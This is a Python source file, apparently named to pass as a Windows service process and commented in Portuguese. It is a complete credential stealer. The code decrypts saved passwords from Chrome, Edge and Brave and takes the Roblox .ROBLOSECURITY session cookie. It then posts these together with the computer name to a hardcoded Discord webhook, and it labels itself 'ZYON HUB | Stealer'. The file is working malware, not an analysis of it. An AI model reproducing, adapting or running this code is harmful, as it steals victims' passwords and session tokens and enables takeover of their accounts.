# language: Python, file: sv_chost.py
import os
import sqlite3
import shutil
import base64
import json
import urllib.request
import win32crypt
from Crypto.Cipher import AES

# ==========================================
# CONFIGURAÇÃO DO WEBHOOK
# ==========================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1566930866641444904/sRinssvkTaFzHyII_5lGlYCKVnmJRSIeb5vMq7XOd245mWEPchhOK_ZmzXwU13o2piV8"

def get_master_key():
    """Pega a chave mestra do Chrome (Local State) para descriptografar senhas novas"""
    local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Remove o prefixo 'DPAPI'
    encrypted_key = encrypted_key[5:]
    # Descriptografa via DPAPI do Windows
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(password, master_key):
    """Descriptografa a senha usando AES-GCM (Chrome v80+)"""
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception:
        try:
            # Fallback para versões antigas do Chrome
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1], 'utf-8')
        except Exception:
            return ""

def steal_browser_data(browser_name, user_data_path):
    """Rouba cookies e senhas de um navegador específico"""
    results = {"cookies": [], "passwords": []}
    
    # 1. Roubo de Cookies (Roblox)
    cookies_path = os.path.join(user_data_path, "Network", "Cookies")
    temp_cookies = os.path.join(os.getenv('TEMP'), 'tmp_cookies.db')
    
    if os.path.exists(cookies_path):
        try:
            shutil.copy2(cookies_path, temp_cookies)
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
            for host, name, enc_val in cursor.fetchall():
                if name == '.ROBLOSECURITY':
                    dec_val = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                    results["cookies"].append(f"{name}: {dec_val}")
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_cookies): os.remove(temp_cookies)

    # 2. Roubo de Senhas (Login Data)
    login_path = os.path.join(user_data_path, "Login Data")
    temp_login = os.path.join(os.getenv('TEMP'), 'tmp_login.db')
    
    if os.path.exists(login_path):
        try:
            shutil.copy2(login_path, temp_login)
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            master_key = get_master_key()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pass in cursor.fetchall():
                if user and enc_pass:
                    dec_pass = decrypt_password(enc_pass, master_key)
                    if dec_pass:
                        results["passwords"].append(f"URL: {url} | User: {user} | Pass: {dec_pass}")
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_login): os.remove(temp_login)

    return results

def send_to_discord(data):
    """Monta o Embed e envia para o Webhook"""
    if not data["cookies"] and not data["passwords"]:
        return

    # Pega o nome do PC
    pc_name = os.getenv('COMPUTERNAME')
    
    # Monta a mensagem (Embed)
    cookies_text = "\n".join(data["cookies"]) if data["cookies"] else "Nenhum cookie encontrado"
    passwords_text = "\n".join(data["passwords"]) if data["passwords"] else "Nenhuma senha encontrada"

    payload = {
        "embeds": [{
            "title": f"Log Capturado - {pc_name}",
            "color": 16711680, # Vermelho
            "fields": [
                {"name": "ROBLOSECURITY", "value": f"```{cookies_text}```", "inline": False},
                {"name": "SENHAS SALVAS", "value": f"```{passwords_text[:1000]}```", "inline": False} # Limita o tamanho para não quebrar o Discord
            ],
            "footer": {"text": "ZYON HUB | Stealer"}
        }]
    }

    data_json = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(WEBHOOK_URL, data=data_json, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'})
    try:
        urllib.request.urlopen(req)
    except Exception:
        pass

def main():
    local_appdata = os.getenv('LOCALAPPDATA')
    
    # Lista de navegadores para roubar
    browsers = {
        "Chrome": os.path.join(local_appdata, 'Google', 'Chrome', 'User Data', 'Default'),
        "Edge": os.path.join(local_appdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
        "Brave": os.path.join(local_appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
    }

    all_data = {"cookies": [], "passwords": []}

    for name, path in browsers.items():
        if os.path.exists(path):
            browser_data = steal_browser_data(name, path)
            all_data["cookies"].extend(browser_data["cookies"])
            all_data["passwords"].extend(browser_data["passwords"])

    # Envia pro Discord
    send_to_discord(all_data)

if __name__ == "__main__":
    main()
